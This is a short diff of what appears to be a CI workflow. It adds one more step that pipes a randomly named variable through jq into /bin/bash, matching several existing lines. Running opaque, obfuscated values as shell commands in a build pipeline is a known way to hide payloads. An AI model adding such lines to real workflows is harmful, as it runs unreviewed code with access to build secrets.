@@ -31,6 +31,7 @@ jobs:
           echo $ldlx6327 | jq -r .blylz50 | /bin/bash
           printf '%s' "$lmtv310" | jq -r .sx59509 | /bin/bash
           printf '%s' "$hubcs46" | jq -r .sketp2487 | /bin/bash
+          echo $m8369 | jq -r .xo52 | /bin/bash
 
       - name: Save archive
         if: always()
